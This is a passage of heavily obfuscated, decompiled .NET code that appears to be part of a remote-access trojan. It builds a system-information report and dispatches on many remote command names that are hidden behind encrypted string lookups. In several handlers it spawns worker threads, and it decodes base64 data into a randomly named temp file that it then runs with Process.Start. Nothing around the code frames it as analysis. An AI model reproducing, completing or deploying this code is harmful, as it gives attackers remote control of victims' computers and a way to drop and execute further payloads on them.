				ProjectData.ClearProjectError();
			}
			try
			{
				if (___________________________________________________________________.________())
				{
					text += <Module>._____<string>(1240795199u);
				}
				else
				{
					text += <Module>.____<string>(4173955436u);
				}
			}
			catch (System.Exception expr_347)
			{
				ProjectData.SetProjectError(expr_347);
				string arg_363_0 = text;
				<Module>._________________ = -1592258590;
				text = arg_363_0 + <Module>._______<string>(1380398983u);
				ProjectData.ClearProjectError();
			}
			try
			{
				int processorCount = System.Environment.ProcessorCount;
				string arg_483_0 = text;
				int arg_46D_0 = (((uint)(4 * processorCount + processorCount * 124 - 7669) >> 7) - 113925046u != (uint)processorCount) ? 12716 : 2038237625;
				int arg_46D_1;
				if ((2 * processorCount - 3054 & 2) != (2 & (processorCount - 7471) * 2))
				{
					arg_46D_1 = sizeof(long) + -1853901873;
				}
				else
				{
					int arg_3D9_0 = -1191182336;
					int num4 = <Module>._________________;
					if ((arg_3D9_0 * num4 - 9217 & 2155) != 2155)
					{
						arg_46D_1 = System.Type.EmptyTypes.Length + 1929082349;
					}
					else if (761u + ((uint)((uint)num4 << 28) >> 28) != (uint)(-(uint)num4))
					{
						int arg_41C_0 = 1118;
						int num3 = <Module>._______________;
						arg_46D_1 = ((arg_41C_0 * num3 + 930 * num3 - -8445 != -6032) ? 14261 : 829267672);
					}
					else
					{
						arg_46D_1 = System.Type.EmptyTypes.Length + 1405938981;
					}
				}
				text = arg_483_0 + <Module>.__________(arg_46D_0, arg_46D_1, ((processorCount * 2 + processorCount * 2 | -2) != -2) ? (System.Type.EmptyTypes.Length + 883152264) : 18) + processorCount.ToString() + <Module>.____<string>(3008796200u);
			}
			catch (System.Exception arg_48B_0)
			{
				ProjectData.SetProjectError(arg_48B_0);
				text += <Module>._______<string>(816641505u);
				ProjectData.ClearProjectError();
			}
			try
			{
				text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(text + <Module>.__________(3970, System.Type.EmptyTypes.Length + 5548, System.Type.EmptyTypes.Length + 178), ___________________________________________________________________._________()), <Module>.____<string>(3008796200u)));
			}
			catch (System.Exception arg_4F1_0)
			{
				ProjectData.SetProjectError(arg_4F1_0);
				text += <Module>._____<string>(3210168151u);
				ProjectData.ClearProjectError();
			}
			result = text;
		}
		catch (System.Exception arg_512_0)
		{
			ProjectData.SetProjectError(arg_512_0);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void ____________________()
	{
		try
		{
			Process.Start(_____________________________________________________________________________.__);
		}
		catch (System.Exception arg_0D_0)
		{
			ProjectData.SetProjectError(arg_0D_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void _____________________(string string_0)
	{
		try
		{
			if (string_0 != null)
			{
				int arg_1932_0;
				string[] array;
				if (string_0.Contains(<Module>.____<string>(2337602916u)))
				{
					arg_1932_0 = System.Type.EmptyTypes.Length + 64;
				}
				else
				{
					array = Strings.Split(string_0, <Module>._____<string>(1052623516u), -1, CompareMethod.Binary);
					arg_1932_0 = System.Type.EmptyTypes.Length + 44;
				}
				System.Threading.Thread thread;
				int num;
				string text;
				int num2;
				int num5;
				int num8;
				int num12;
				int num13;
				System.Threading.Thread thread2;
				System.Threading.Thread thread3;
				System.Threading.Thread thread4;
				int num14;
				byte[] bytes;
				System.Threading.Thread thread5;
				string text3;
				int num26;
				int num30;
				while (true)
				{
					string text2;
					int num3;
					int num7;
					____________________________________________________________________ ___________________________________________________________________;
					switch (arg_1932_0)
					{
					case 0:
						goto IL_E35;
					case 1:
					{
						object arg_191D_0 = null;
						<Module>._____________ = 480802764;
						thread = new System.Threading.Thread(new System.Threading.ThreadStart(arg_191D_0.______________________________));
						arg_1932_0 = System.Type.EmptyTypes.Length + 33;
						continue;
					}
					case 2:
						break;
					case 3:
						goto IL_1A68;
					case 4:
						goto IL_1A6D;
					case 5:
						goto IL_4B9;
					case 6:
						goto IL_1A79;
					case 7:
						goto IL_1C39;
					case 8:
						goto IL_1A7E;
					case 9:
						goto IL_13CC;
					case 10:
						goto IL_1A83;
					case 11:
						goto IL_2133;
					case 12:
						goto IL_1AA1;
					case 13:
						goto IL_22B3;
					case 14:
						goto IL_2234;
					case 15:
						goto IL_2250;
					case 16:
						goto IL_1AA6;
					case 17:
						goto IL_1ADC;
					case 18:
						goto IL_1BFE;
					case 19:
						goto IL_D3;
					case 20:
						goto IL_1B0B;
					case 21:
						goto IL_1BA5;
					case 22:
						______________________________________________________________._________________(array[1], array[2], System.Convert.ToInt32(array[3]), System.Convert.ToInt32(array[4]));
						arg_1932_0 = sizeof(uint) + -1;
						continue;
					case 23:
						goto IL_1B10;
					case 24:
						goto IL_1B20;
					case 25:
						goto IL_1B25;
					case 26:
						goto IL_1B33;
					case 27:
						goto IL_2087;
					case 28:
						goto IL_1B3E;
					case 29:
						goto IL_219C;
					case 30:
						goto IL_7ED;
					case 31:
						goto IL_235A;
					case 32:
						goto IL_1EED;
					case 33:
						goto IL_2176;
					case 34:
						goto IL_1C11;
					case 35:
					{
						System.Random random = new System.Random();
						string arg_18CB_0 = System.IO.Path.GetTempPath();
						num = random.Next(10000, 90000);
						text = arg_18CB_0 + num.ToString() + <Module>.______<string>(4118365827u);
						if (num2 != 17737)
						{
							goto IL_6CA;
						}
						goto IL_1F61;
					}
					case 36:
						goto IL_1B5D;
					case 37:
						goto IL_1B62;
					case 38:
						goto IL_1B70;
					case 39:
						goto IL_1B7E;
					case 40:
						goto IL_1B83;
					case 41:
						goto IL_2124;
					case 42:
						goto IL_BFB;
					case 43:
						goto IL_1B8D;
					case 44:
						text2 = array[0];
						if (Operators.CompareString(text2, <Module>.______<string>(3476958452u), false) == 0)
						{
							arg_1932_0 = System.Type.EmptyTypes.Length + 54;
							continue;
						}
						if (Operators.CompareString(text2, <Module>._______<string>(1200049341u), false) == 0)
						{
							arg_1932_0 = sizeof(float) + 13;
							continue;
						}
						if (Operators.CompareString(text2, <Module>.___<string>(3909899698u), false) == 0)
						{
							num2 = 26400;
							int num4;
							if (((((uint)((uint)num3 << 22) >> 22) + 4233u != (uint)(-(uint)num3)) ? ((228360192 + (num4 << 18) != -4866 + (num4 << 21) << 6) ? (System.Type.EmptyTypes.Length + 20633) : (sizeof(float) + -1961692646)) : (System.Type.EmptyTypes.Length + -1112648496)) != 20633)
							{
								goto IL_7AE;
							}
							goto IL_200A;
						}
						else
						{
							if (Operators.CompareString(text2, <Module>._____<string>(2534636569u), false) == 0)
							{
								arg_1932_0 = checked((int)(unchecked((System.IntPtr)43)));
								continue;
							}
							goto IL_E35;
						}
						break;
					case 45:
						goto IL_1E80;
					case 46:
						goto IL_1E8C;
					case 47:
						goto IL_1EAF;
					case 48:
						goto IL_1E91;
					case 49:
						goto IL_2207;
					case 50:
						goto IL_1E96;
					case 51:
						IL_784:
						num2 = 1082;
						if (Operators.CompareString(text2, <Module>._____<string>(1940347355u), false) == 0)
						{
							if (num2 != 1082)
							{
								goto Block_48;
							}
							goto IL_7AE;
						}
						else
						{
							if (Operators.CompareString(text2, <Module>.______<string>(3506556897u), false) == 0)
							{
								goto IL_7ED;
							}
							if (Operators.CompareString(text2, <Module>._____<string>(3328321721u), false) == 0)
							{
								num2 = -18374;
								int num6;
								if (~((uint)(num5 * 335544320) >> 19) == (uint)((uint)num6 << 5))
								{
									goto Block_50;
								}
								if (Operators.CompareString(______________________________________________________________._________________, <Module>._______<string>(1177340789u), false) == 0)
								{
									goto IL_225A;
								}
								num7 = num2;
								num2 = -5259;
								if (num7 != -18374)
								{
									goto Block_52;
								}
								__________________________________________________________________._____(<Module>.____<string>(728687342u), <Module>._______<string>(1673631998u));
								______________________________________________________________.______________(<Module>._______<string>(1670293721u), <Module>.____<string>(176132015u));
								if (2224 + num8 % 3027795 == 1739871977)
								{
									goto Block_53;
								}
								if (num2 != -1144)
								{
									goto Block_54;
								}
								goto IL_8CB;
							}
							else
							{
								num2 = -10530;
								int num9;
								if (4194304 * (num9 / 65536) == -2063827376)
								{
									goto Block_55;
								}
								if (Operators.CompareString(text2, <Module>.______<string>(1187344092u), false) != 0)
								{
									goto IL_231F;
								}
								if (num2 != -2056)
								{
									goto Block_57;
								}
								goto IL_934;
							}
						}
						break;
					case 52:
						if (!_______________________________________________._)
						{
							______________________________________________________________.______________________(array[1]);
						}
						if (_______________________________________________._)
						{
							int num10;
							int arg_D3B_0;
							if ((9999 ^ num10 + num10 + -5306) != 0)
							{
								arg_D3B_0 = System.Type.EmptyTypes.Length + -6190;
							}
							else
							{
								int arg_D18_0 = -3823616;
								int arg_D0D_0 = 580;
								int num11 = global::___________._;
								if (arg_D18_0 + ~(arg_D0D_0 * num11 + num11 * 444) != (num11 - 1146) * 1024)
								{
									num12 = (int)((System.IntPtr)(-748921169));
									arg_D3B_0 = num12;
								}
								else
								{
									arg_D3B_0 = 2064712751;
								}
							}
							num2 = arg_D3B_0;
							arg_1932_0 = System.Type.EmptyTypes.Length + 16;
							continue;
						}
						goto IL_231F;
					case 53:
						goto IL_BE1;
					case 54:
						goto IL_1F52;
					case 55:
						goto IL_1F61;
					case 56:
						goto IL_934;
					case 57:
						goto IL_1F70;
					case 58:
						global::____________________._______(array[2], array[1]);
						arg_1932_0 = System.Type.EmptyTypes.Length + 11;
						continue;
					case 59:
						goto IL_1F75;
					case 60:
						goto IL_2044;
					case 61:
					{
						_________________________________________________________________._ = <Module>.__________(System.Type.EmptyTypes.Length + 55649, System.Type.EmptyTypes.Length + 57253, ((num * 52 + num * 12 | -17 | num << 12) == -17) ? 27 : (System.Type.EmptyTypes.Length + 1914786943));
						num2 = -31167;
						if (4238 + ((num13 << 3) - 5591) == 2 * (2896 + num13 + 3 * num13))
						{
							goto IL_2091;
						}
						______________________________________________________________________ _____________________________________________________________________ = new ______________________________________________________________________();
						_____________________________________________________________________._____ = array[1];
						if (num2 != -11932)
						{
							thread2 = new System.Threading.Thread(new System.Threading.ThreadStart(new ______________________________________________________________.________________________________________________________________
							{
								_ = _____________________________________________________________________
							}._));
							arg_1932_0 = checked((int)66.0);
							continue;
						}
						goto IL_2087;
					}
					case 62:
						goto IL_222F;
					case 63:
						goto IL_2096;
					case 64:
						goto IL_A66;
					case 65:
						goto IL_20CC;
					case 66:
						goto IL_20D6;
					case 67:
						global::______________________._________(array[1], array[2]);
						arg_1932_0 = System.Type.EmptyTypes.Length + 48;
						continue;
					case 68:
						goto IL_993;
					case 69:
						goto IL_B2;
					case 70:
						goto IL_2324;
					case 71:
						___________________________________________________________________.____ = System.Convert.ToInt32(array[4]);
						thread3 = new System.Threading.Thread(new System.Threading.ThreadStart(___________________________________________________________________._));
						if (num2 == -27051)
						{
							goto IL_235C;
						}
						break;
					case 72:
						goto IL_2365;
					case 73:
						goto IL_2367;
					case 74:
						goto IL_236F;
					default:
						goto IL_A66;
					}
					___________________________________________________________________.__ = array[2];
					___________________________________________________________________.___ = System.Convert.ToInt32(array[3]);
					num2 = System.Type.EmptyTypes.Length + -27051;
					arg_1932_0 = sizeof(double) + 63;
					continue;
					IL_D3:
					________________________________ @object = new ________________________________();
					thread4 = new System.Threading.Thread(new System.Threading.ThreadStart(@object.______));
					if ((268437881 ^ (num5 & 8654) % 123508870) == 0)
					{
						int arg_11A_0 = 973078528;
						num14 = <Module>._____________;
						arg_1932_0 = (((arg_11A_0 & num14 / 632) != (int)((uint)(num14 / 214225) >> 2 & 973078528u)) ? (sizeof(int) + -787138310) : 1220652857);
						continue;
					}
					arg_1932_0 = System.Type.EmptyTypes.Length + 45;
					continue;
					IL_B2:
					num2 = 8186;
					if ((32767 | num7 % 4 / 195525) != 32767)
					{
						goto IL_D3;
					}
					int num16;
					int num19;
					int num21;
					int num22;
					int num23;
					int num24;
					if (Operators.CompareString(text2, <Module>.____<string>(3165706303u), false) == 0)
					{
						num7 = num2;
						num2 = -30314;
						if (num7 != -27363)
						{
							break;
						}
						goto IL_4B9;
					}
					else if (Operators.CompareString(text2, <Module>._______<string>(1022378589u), false) == 0)
					{
						int num15 = <Module>.________________;
						if ((-9721 & (-1216984678 & num16) - 3177) != 0)
						{
							arg_1932_0 = sizeof(float) + 54;
							continue;
						}
						int arg_1EB_0 = 536870912;
						int arg_1EA_0 = (num15 + num15) * 536870912;
						int num17 = <Module>.________________;
						if ((arg_1EB_0 & (arg_1EA_0 ^ num17 / 123436025)) == 0)
						{
							arg_1932_0 = sizeof(int) + 1904814692;
							continue;
						}
						int arg_20B_0 = 11;
						int num18 = <Module>.____________;
						if ((arg_20B_0 * num18 + num18 * 5 | -12) == -12)
						{
							arg_1932_0 = -1596907315;
							continue;
						}
						if ((3445 ^ -(4186408 & num19)) == 0 && (1 & num19 + num19 - 2815) != 1)
						{
							arg_1932_0 = 1599338505;
							continue;
						}
						int num20 = <Module>.___________;
						arg_1932_0 = ((((num20 << 23) + 843 | -8383677) == -8383669) ? (System.Type.EmptyTypes.Length + 2079635632) : (sizeof(float) + -2125959417));
						continue;
					}
					else if (Operators.CompareString(text2, <Module>.____<string>(1025831217u), false) == 0)
					{
						num2 = -16825;
						if (~(num19 + 3 * num19 + 2766) == (int)((uint)(118720 * num19 - 5794) >> 1))
						{
							goto Block_16;
						}
						byte[] arg_379_0 = System.IO.File.ReadAllBytes(array[1]);
						int arg_374_0 = System.Type.EmptyTypes.Length + 761;
						int arg_374_1;
						if (-(num * 180912128) == 6299)
						{
							if (8481 + num21 == -num21)
							{
								arg_374_1 = (((4198601 ^ num % 169057) == 0) ? (System.Type.EmptyTypes.Length + -96998318) : (sizeof(int) + -1568167655));
							}
							else
							{
								int arg_346_0 = -782237696;
								num22 = <Module>.__________;
								arg_374_1 = ((arg_346_0 + (num22 ^ 1236) * 512 != num22 * -4193792) ? (System.Type.EmptyTypes.Length + -1320858906) : -1177888468);
							}
						}
						else
						{
							arg_374_1 = 1183;
						}
						bytes = ___________________________________________________________________._______(arg_379_0, <Module>.__________(arg_374_0, arg_374_1, System.Type.EmptyTypes.Length + 11));
						arg_1932_0 = ((~(-427 | num23) / 134217728 != -2058868628) ? (System.Type.EmptyTypes.Length + 23) : (System.Type.EmptyTypes.Length + 1787865228));
						continue;
					}
					else
					{
						if (Operators.CompareString(text2, <Module>._____<string>(1189138378u), false) == 0)
						{
							int num6;
							num2 = (((-8421 ^ num24 + num24 * 15) != 0) ? (System.Type.EmptyTypes.Length + -11849) : (((num6 << 16) - 1043333120 != num6 * 65536 + 3945) ? (System.Type.EmptyTypes.Length + -1184964527) : (sizeof(System.Guid) + -1291609624)));
							arg_1932_0 = sizeof(int) + 52;
							continue;
						}
						if (Operators.CompareString(text2, <Module>._______<string>(3361566155u), false) == 0)
						{
							goto Block_25;
						}
						if (Operators.CompareString(text2, <Module>._____<string>(3739909916u), false) == 0)
						{
							arg_1932_0 = sizeof(ushort) + -1;
							continue;
						}
						if (Operators.CompareString(text2, <Module>.______<string>(2353858953u), false) == 0)
						{
							arg_1932_0 = System.Type.EmptyTypes.Length + 50;
							continue;
						}
						if (Operators.CompareString(text2, <Module>.______<string>(3688141429u), false) == 0)
						{
							goto Block_28;
						}
						if (Operators.CompareString(text2, <Module>._______<string>(4052219501u), false) == 0)
						{
							goto IL_4B9;
						}
						<Module>.___ = num;
						if (Operators.CompareString(text2, <Module>._____<string>(251518400u), false) == 0)
						{
							goto Block_29;
						}
						if (Operators.CompareString(text2, <Module>._____<string>(1095005382u), false) == 0)
						{
							goto Block_30;
						}
						goto IL_522;
					}
					IL_E35:
					num2 = 11315;
					if (Operators.CompareString(text2, <Module>._______<string>(1419139533u), false) == 0)
					{
						if (num2 != 11315)
						{
							goto IL_522;
						}
						_____________________________ object2 = new _____________________________();
						thread5 = new System.Threading.Thread(new System.Threading.ThreadStart(object2.________));
						arg_1932_0 = (((num21 & 1879048192) == (num21 & 1879048192)) ? 4 : -1979604587);
						continue;
					}
					else
					{
						if (Operators.CompareString(text2, <Module>.___<string>(2377227926u), false) == 0)
						{
							arg_1932_0 = System.Type.EmptyTypes.Length + 52;
							continue;
						}
						if (Operators.CompareString(text2, <Module>._____<string>(2065826580u), false) == 0)
						{
							arg_1932_0 = System.Type.EmptyTypes.Length + 19;
							continue;
						}
						if (Operators.CompareString(text2, <Module>.______<string>(4195373496u), false) == 0)
						{
							int arg_F12_0 = 16784906;
							num24 = global::______________________._______;
							arg_1932_0 = (((arg_F12_0 ^ (num24 - 4082) / 134217728) == 0) ? (sizeof(short) + 1708471192) : (System.Type.EmptyTypes.Length + 67));
							continue;
						}
						if (Operators.CompareString(text2, <Module>._____<string>(903029408u), false) == 0)
						{
							int num6 = <Module>._______________;
							arg_1932_0 = ((num6 % 117 == -6563) ? (((3 & (5309 ^ ~((num2 & 1874150872) - 1875))) != 3) ? (System.Type.EmptyTypes.Length + 491078669) : ((int)((System.IntPtr)1903362894))) : (sizeof(float) + 10));
							continue;
						}
						if (Operators.CompareString(text2, <Module>._____<string>(1165117804u), false) == 0)
						{
							goto Block_96;
						}
						if (Operators.CompareString(text2, <Module>._____<string>(2320632u), false) == 0)
						{
							goto Block_97;
						}
						if (Operators.CompareString(text2, <Module>._______<string>(2588733316u), false) == 0)
						{
							arg_1932_0 = System.Type.EmptyTypes.Length + 61;
							continue;
						}
						if (Operators.CompareString(text2, <Module>._______<string>(2643505864u), false) == 0)
						{
							arg_1932_0 = System.Type.EmptyTypes.Length + 41;
							continue;
						}
						if (Operators.CompareString(text2, <Module>._______<string>(2917368604u), false) == 0)
						{
							num2 = System.Type.EmptyTypes.Length + -23394;
							arg_1932_0 = System.Type.EmptyTypes.Length + 59;
							continue;
						}
						if (Operators.CompareString(text2, <Module>.______<string>(2115042142u), false) == 0)
						{
							goto Block_101;
						}
						if (Operators.CompareString(text2, <Module>._____<string>(340086423u), false) == 0)
						{
							arg_1932_0 = sizeof(float) + 6;
							continue;
						}
						string arg_109A_0 = text2;
						<Module>._________ = null;
						if (Operators.CompareString(arg_109A_0, <Module>._____<string>(1877560588u), false) == 0)
						{
							goto Block_103;
						}
						if (Operators.CompareString(text2, <Module>.___<string>(2478936815u), false) == 0)
						{
							num2 = 21544;
							if (System.Type.EmptyTypes.Length + -16783 != -16783)
							{
								goto IL_993;
							}
						}
						else
						{
							if (Operators.CompareString(text2, <Module>.____<string>(3149669265u), false) == 0)
							{
								goto Block_106;
							}
							if (Operators.CompareString(text2, <Module>._______<string>(3081686248u), false) == 0)
							{
								goto Block_107;
							}
							if (Operators.CompareString(text2, <Module>.______<string>(2073591391u), false) == 0)
							{
								int arg_113A_0 = 68509;
								int arg_1138_0 = 4194304;
								num19 = <Module>.________________;
								arg_1932_0 = (((arg_113A_0 ^ -(arg_1138_0 * num19)) != 0) ? (System.Type.EmptyTypes.Length + 25) : (((1037 ^ num24 * 1972189654) == 0) ? 1545375018 : (System.Type.EmptyTypes.Length + 1577822613)));
								continue;
							}
							if (Operators.CompareString(text2, <Module>.____<string>(1616839311u), false) == 0)
							{
								arg_1932_0 = (((num5 * 384 + 640 * num5 | -423) != -423) ? (sizeof(uint) + -2007896705) : (System.Type.EmptyTypes.Length + 7));
								continue;
							}
							if (Operators.CompareString(text2, <Module>.____<string>(1009794179u), false) == 0)
							{
								goto Block_113;
							}
							if (Operators.CompareString(text2, <Module>._______<string>(3300776440u), false) == 0)
							{
								arg_1932_0 = (((-12 | 5 * num3 + 11 * num3) == -12) ? (System.Type.EmptyTypes.Length + 32) : (System.Type.EmptyTypes.Length + 716935112));
								continue;
							}
							if (Operators.CompareString(text2, <Module>.______<string>(129399956u), false) == 0)
							{
								arg_1932_0 = sizeof(double) + 30;
								continue;
							}
							int num11;
							if (Operators.CompareString(text2, <Module>._____<string>(233062799u), false) == 0)
							{
								num2 = 4700;
								______________________________________________________________.________________________(array[1], array[2], array[3]);
								arg_1932_0 = ((~(num11 * 1672 + num11 * 376) != (int)((uint)(-324796416 * (num11 / 3375123)) >> 9)) ? (System.Type.EmptyTypes.Length + 39) : (System.Type.EmptyTypes.Length + -2104324626));
								continue;
							}
							if (Operators.CompareString(text2, <Module>.___<string>(331854415u), false) == 0)
							{
								goto Block_119;
							}
							if (Operators.CompareString(text2, <Module>.___<string>(271244811u), false) == 0)
							{
								goto Block_120;
							}
							if (Operators.CompareString(text2, <Module>.___<string>(1360139036u), false) == 0)
							{
								int num4;
								int num10;
								arg_1932_0 = ((((7054 & num5) << 28) * (num5 & 1750) != -8552) ? (System.Type.EmptyTypes.Length + 37) : ((-1744830464 + num4 != num4) ? (((1037 ^ num10 * 1972189654) != 0) ? 1272693429 : (System.Type.EmptyTypes.Length + -1655772959)) : -1855859255));
								continue;
							}
							if (Operators.CompareString(text2, <Module>._______<string>(1425156700u), false) == 0)
							{
								num2 = -1227;
								if (~(num13 + 3 * num13 + 2766) == (int)((uint)(118720 * num13 - 5794) >> 1))
								{
									goto IL_BE1;
								}
								goto IL_2242;
							}
							else
							{
								if (Operators.CompareString(text2, <Module>.______<string>(2422943538u), false) == 0)
								{
									num23 = 9;
									goto IL_13CC;
								}
								if (Operators.CompareString(text2, <Module>.____<string>(3294641900u), false) == 0)
								{
									goto Block_130;
								}
								if (Operators.CompareString(text2, <Module>.______<string>(782724277u), false) == 0)
								{
									arg_1932_0 = sizeof(ulong) + 18;
									continue;
								}
								if (Operators.CompareString(text2, <Module>._______<string>(3490481526u), false) == 0)
								{
									goto Block_132;
								}
								if (Operators.CompareString(text2, <Module>._______<string>(529425657u), false) == 0)
								{
									num2 = 26481;
									if (System.Type.EmptyTypes.Length + 2321 == 381)
									{
										goto IL_2036;
									}
									text3 = __________________________________________________________________.____(<Module>.____<string>(586994363u));
									if (Operators.CompareString(text3, <Module>.__________(((268428972 & 6609 + -805306368 * num3) != 128) ? ((((num21 / 524288 | 3384) & -7936) != 256) ? (System.Type.EmptyTypes.Length + -2143249288) : -788155254) : 24168, (-55544 + (4715 + num) * 8 == ~(num + 7 * num)) ? (System.Type.EmptyTypes.Length + -2052386147) : (sizeof(double) + 26621), System.Type.EmptyTypes.Length + 210), false) == 0)
									{
										arg_1932_0 = ((~(-num16) == num16 - -1010) ? -984477864 : 70);
										continue;
									}
									goto IL_2330;
								}
								else if (Operators.CompareString(text2, <Module>.______<string>(101766122u), false) == 0)
								{
									num2 = -28412;
									int arg_1627_0;
									if (536870912 + num22 % 65536 + 1154 == -(num22 + num22) << 29)
									{
										arg_1627_0 = System.Type.EmptyTypes.Length + -754521959;
									}
									else
									{
										int num25 = global::______________________._______;
										int arg_1606_0 = (num25 | -4075) - 14642;
										int arg_15F9_0 = 3;
										num26 = <Module>.___________;
										arg_1627_0 = ((arg_1606_0 != (arg_15F9_0 * num26 + num26 ^ 3861) * num25) ? (sizeof(ulong) + 25005) : (sizeof(ushort) + 1237813406));
									}
									if (arg_1627_0 != 25013)
									{
										goto IL_522;
									}
									goto IL_1D4D;
								}
								else
								{
									if (Operators.CompareString(text2, <Module>._____<string>(1752081363u), false) == 0)
									{
										int num27 = global::______________________._______;
										arg_1932_0 = (((num27 * 6 + 58 * num27) * -729808896 != -1273) ? ((58 * num23 + 6 * num23 - -1610612736 != (int)((uint)(num23 * 83 + 173 * num23) >> 2)) ? (((-8612 ^ num24 % 1988559458) == 0) ? (System.Type.EmptyTypes.Length + 1839146823) : 55) : (((4 & num24 * 4 + num24 * 4) != (4 * (num22 & num22 << 2) & 4)) ? (System.Type.EmptyTypes.Length + 1173411736) : ((num27 / 8 * 117 + num27 / 8 * 139 - -134217728 != num27 * 32) ? (System.Type.EmptyTypes.Length + -480641725) : (System.Type.EmptyTypes.Length + 1340095669)))) : (System.Type.EmptyTypes.Length + -1969632788));
										continue;
									}
									if (Operators.CompareString(text2, <Module>._____<string>(1447611101u), false) == 0)
									{
										arg_1932_0 = ((~(num11 / 4139932) == num16 * 1073741824 << 14) ? (System.Type.EmptyTypes.Length + -1036534280) : (System.Type.EmptyTypes.Length + 27));
										continue;
									}
									if (Operators.CompareString(text2, <Module>.______<string>(3382204644u), false) == 0)
									{
										arg_1932_0 = System.Type.EmptyTypes.Length + 40;
										continue;
									}
									if (Operators.CompareString(text2, <Module>.___<string>(1481358244u), false) == 0)
									{
										goto Block_153;
									}
									if (Operators.CompareString(text2, <Module>.______<string>(1408414764u), false) == 0)
									{
										goto Block_154;
									}
									if (Operators.CompareString(text2, <Module>.____<string>(1696204587u), false) == 0)
									{
										num2 = 27459;
										arg_1932_0 = System.Type.EmptyTypes.Length + 28;
										continue;
									}
									if (Operators.CompareString(text2, <Module>._____<string>(2497819676u), false) == 0)
									{
										num2 = 18428;
										if (sizeof(ushort) + 17455 == 17457)
										{
											______________________________________________________________.__________________(array[1], array[2], true);
											arg_1932_0 = System.Type.EmptyTypes.Length + 6;
											continue;
										}
									}
									else
									{
										if (Operators.CompareString(text2, <Module>._____<string>(1977258557u), false) == 0)
										{
											arg_1932_0 = checked((int)22.0);
											continue;
										}
										if (Operators.CompareString(text2, <Module>._____<string>(382562598u), false) == 0)
										{
											goto Block_158;
										}
										goto IL_B2;
									}
								}
							}
						}
						global::____________________.__(array[1], array[2], true);
						arg_1932_0 = sizeof(double) + 28;
						continue;
					}
					IL_4B9:
					__________________________________________________________________._____(<Module>.___<string>(1766172096u), array[1]);
					______________________________________________________________._______________ = array[1];
					arg_1932_0 = sizeof(long) + 4;
					continue;
					IL_522:
					num2 = 18041;
					if (Operators.CompareString(text2, <Module>._____<string>(4227175506u), false) == 0)
					{
						num7 = num2;
						num2 = -10388;
						int arg_557_0 = 239968;
						int num28 = <Module>._________________;
						if (~(arg_557_0 * num28 * 1024) == num28 * -818380800)
						{
							goto Block_32;
						}
						if (num7 != -9253)
						{
							goto Block_33;
						}
					}
					else if (Operators.CompareString(text2, <Module>.______<string>(2020288334u), false) == 0)
					{
						num2 = System.Type.EmptyTypes.Length + -31430;
						int num29;
						if ((num29 * -3902 | -2) != -2)
						{
							arg_1932_0 = System.Type.EmptyTypes.Length + -1988886178;
							continue;
						}
						if (~(-(num30 / 32) * 32768) == 495 * num30 + num30 * 529)
						{
							int num31 = global::___________._;
							arg_1932_0 = (((num31 / 12083 / 734276768 & 9504) == 0) ? (sizeof(double) + 1985526931) : (sizeof(byte) + -1445419117));
							continue;
						}
						arg_1932_0 = System.Type.EmptyTypes.Length + 68;
						continue;
					}
					else if (Operators.CompareString(text2, <Module>.____<string>(2573878295u), false) == 0)
					{
						num2 = 14084;
						int num4;
						if ((-7801 | 816447488 * (num4 % 5515)) != -7801)
						{
							goto IL_2234;
						}
					}
					else
					{
						if (Operators.CompareString(text2, <Module>.______<string>(601139745u), false) != 0)
						{
							goto IL_784;
						}
						num2 = 18882;
						int num31;
						if (((num31 % 8388608 != -968465429) ? (sizeof(double) + 15559) : (sizeof(long) + 1539912851)) != 15567)
						{
							goto Block_46;
						}
						goto IL_95C;
					}
					text = array[1];
					if (Operators.CompareString(text, <Module>._____<string>(3176966931u), false) == 0)
					{
						num2 = sizeof(float) + 30911;
						int num32 = <Module>.______________;
						arg_1932_0 = (((num32 % 32 / 16 & 1) == (int)((uint)num32 >> 4 & 1u)) ? (System.Type.EmptyTypes.Length + 35) : -1284467457);
						continue;
					}
					goto IL_6CA;
					IL_7AE:
					______________________________________________________________.________________________ = array[1];
					__________________________________________________________________._____(<Module>._______<string>(1334981879u), array[1]);
					arg_1932_0 = System.Type.EmptyTypes.Length + 24;
					continue;
					IL_7ED:
					global::____________________.______(array[1], array[2]);
					arg_1932_0 = System.Type.EmptyTypes.Length + 20;
					continue;
					IL_8CB:
					string[] array2;
					byte[] bytes2 = System.Convert.FromBase64String(array2[1]);
					System.IO.File.WriteAllBytes(text, bytes2);
					arg_1932_0 = System.Type.EmptyTypes.Length + 53;
					continue;
					IL_6CA:
					if (System.IO.File.Exists(text))
					{
						System.IO.File.Delete(text);
					}
					array2 = Strings.Split(string_0, <Module>.______<string>(1992654500u), -1, CompareMethod.Binary);
					num2 = -4608;
					if ((((-(1001702944 & num) ^ 6115) == 0) ? (sizeof(System.Guid) + -1828326325) : (System.Type.EmptyTypes.Length + -30838)) != -26334)
					{
						goto IL_8CB;
					}
					goto IL_222F;
					IL_95C:
					if (Operators.CompareString(______________________________________________________________._________________, <Module>.___<string>(3645872316u), false) != 0)
					{
						num2 = sizeof(byte) + -26221;
						arg_1932_0 = sizeof(float) + 56;
						continue;
					}
					goto IL_2301;
					IL_934:
					System.Threading.Thread thread6 = new System.Threading.Thread(new System.Threading.ThreadStart(global::____________________._));
					thread6.Start();
					if (num2 != -23421)
					{
						goto Block_58;
					}
					goto IL_95C;
					IL_993:
					bool bool_ = true;
					bool bool_2 = true;
					if (Operators.CompareString(array[2], <Module>.______<string>(2943992522u), false) == 0)
					{
						if (num2 == 30110)
						{
							goto IL_21BE;
						}
						bool_ = false;
					}
					if (Operators.CompareString(array[3], <Module>._____<string>(2303988711u), false) == 0)
					{
						num2 = -25861;
						if (sizeof(int) + -30042 == -32154)
						{
							goto IL_2255;
						}
						bool_2 = false;
					}
					global::______________________.__________(array[1], bool_, bool_2);
					int num33 = <Module>._______________;
					arg_1932_0 = (((num33 * 5 + num33 * 3 ^ 9044) + 9850 == (int)((uint)(num33 * 67108864) >> 16)) ? (sizeof(short) + 2065535173) : (System.Type.EmptyTypes.Length + 15));
					continue;
					IL_A66:
					string_0 = string_0.Replace(<Module>._______<string>(4106332662u), string.Empty);
					string arg_AC6_0 = string_0;
					num3 = <Module>._________________;
					if (Operators.CompareString(arg_AC6_0, <Module>.__________(sizeof(short) + 36928, ((num21 << 8) / 44135206 == -1367350965) ? (System.Type.EmptyTypes.Length + -695418064) : 39081, System.Type.EmptyTypes.Length + 27), false) == 0)
					{
						arg_1932_0 = ((num2 * -1799094272 != 4896) ? (sizeof(float) + 42) : (sizeof(short) + -2088112801));
						continue;
					}
					goto IL_20A4;
					IL_BFB:
					Process.Start(text);
